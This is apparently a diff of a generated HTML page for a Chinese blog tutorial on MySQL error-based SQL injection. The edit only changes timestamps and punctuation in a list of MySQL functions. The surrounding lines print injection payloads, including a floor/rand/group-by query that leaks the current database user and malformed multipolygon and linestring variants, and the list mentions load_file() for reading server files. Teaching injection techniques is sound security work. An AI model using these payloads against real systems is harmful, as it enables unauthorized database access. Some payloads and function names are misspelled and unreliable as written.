@@ -26,7 +26,7 @@
 <meta property="og:image" content="http://img-blog.csdnimg.cn/20190924231722501.png">
 <meta property="og:image" content="http://img-blog.csdnimg.cn/20190924234220930.png">
 <meta property="og:image" content="http://img-blog.csdnimg.cn/2019092423510129.png">
-<meta property="og:updated_time" content="2019-10-15T12:51:22.971Z">
+<meta property="og:updated_time" content="2019-10-15T12:55:15.836Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入-报错注入">
 <meta name="twitter:description" content="前言之前没有对SQL报错注入详细总结过，总结一下。 SQL报错注入利用前提: 页面上没有显示位，但是需要输出 SQL 语句执行错误信息。比如 mysql_error()优点: 不需要显示位缺点: 需要输出 mysql_error( )的报错信息 12种SQL报错注入语句1、通过floor报错,注入语句如下:and (select 1 from (select count(*),concat(use">
@@ -176,7 +176,7 @@
 <p>11、通过multpolygon ()报错,注入语句如下:<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">and multpolygon (()<span class="keyword">select</span> * <span class="keyword">from</span>(selectuser () )a)b );</span><br></pre></td></tr></table></figure></p>
 <p>12、通过linestring ()报错,注入语句如下:<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">and linestring (()<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>() )a)b );</span><br></pre></td></tr></table></figure></p>
 <h3 id="mysql-常用函数"><a href="#mysql-常用函数" class="headerlink" title="mysql 常用函数"></a>mysql 常用函数</h3><p><strong>系统信息函数</strong></p>
-<p><code>database()</code>   返回当前数据库名<br><code>user()</code>或<code>system_user()</code>  返回当前登陆用户名<br><code>version()</code> 或<code>@@version</code>  返回MySQL服务器的版本<br><code>benchmapk(count,expr)</code>  将表达式expr重复运行count次<br><code>connection_id()</code>   返回当前客户的连接ID<br><code>found_rows()</code>   返回最后一个SELECT查询进行检索的总行数<br><code>session_user()</code>：连接数据库的用户名<br><code>current_user</code>：当前用户名<br><code>load_file()</code>：读取本地文件<br><code>@@datadir</code>：读取数据库路径<br><code>@@basedir</code>：mysql安装路径<br><code>@@version_complie_os</code>：查看操作系统</p>
+<p><code>database()</code>   返回当前数据库名<br><code>user()</code>或<code>system_user()</code>  返回当前登陆用户名<br><code>version()</code> 或<code>@@version</code>  返回MySQL服务器的版本<br><code>benchmapk(count,expr)</code>  将表达式expr重复运行count次<br><code>connection_id()</code>   返回当前客户的连接ID<br><code>found_rows()</code>   返回最后一个SELECT查询进行检索的总行数<br><code>session_user()</code>    连接数据库的用户名<br><code>current_user</code>  当前用户名<br><code>load_file()</code>   读取本地文件<br><code>@@datadir</code> 读取数据库路径<br><code>@@basedir</code> mysql安装路径<br><code>@@version_complie_os</code>  查看操作系统</p>
 <p>更多参考：<a href="https://blog.csdn.net/william_n/article/details/100827828" target="_blank" rel="noopener">mysql 常用函数收集</a></p>
 <h3 id="常见SQL报错注入"><a href="#常见SQL报错注入" class="headerlink" title="常见SQL报错注入"></a>常见SQL报错注入</h3><p>SQL注入有12个报错方式，比较常见的有floor报错注入、extractvalue报错注入、updatexml报错注入和exp报错注入</p>
 <h4 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h4><p>floor报错注入是利用 count()函数 、rand()函数 、floor()函数 、group by 这几个特定的函数结合在一起产生的注入漏洞。缺一不可<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure></p>
@@ -270,7 +270,7 @@
 
             <div class="post-copyright">
     <div class="content">
-        <p>最后更新： 2019年10月15日 20:51</p>
+        <p>最后更新： 2019年10月15日 20:55</p>
         <p>原始链接： <a class="post-url" href="/2019/09/25/SQL注入-报错注入/" title="SQL注入-报错注入">https://qwzf.github.io/2019/09/25/SQL注入-报错注入/</a></p>
         <footer>
             <a href="https://qwzf.github.io">
